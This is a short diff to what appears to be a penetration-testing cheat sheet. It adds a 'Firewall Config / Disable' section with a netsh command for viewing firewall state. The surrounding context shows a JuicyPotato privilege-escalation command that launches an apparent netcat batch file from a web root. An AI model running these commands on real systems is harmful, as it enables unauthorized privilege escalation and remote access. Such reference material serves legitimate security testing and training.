@@ -253,6 +253,14 @@ cmd> whoami /privs
 cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 ```
 
+### Firewall Config / Disable
+
+Netsh
+```
+cmd> netsh [advfirewall] firewall show state name=all
+```
+
+
 ## File Transfer Methods
 
 ### Linux
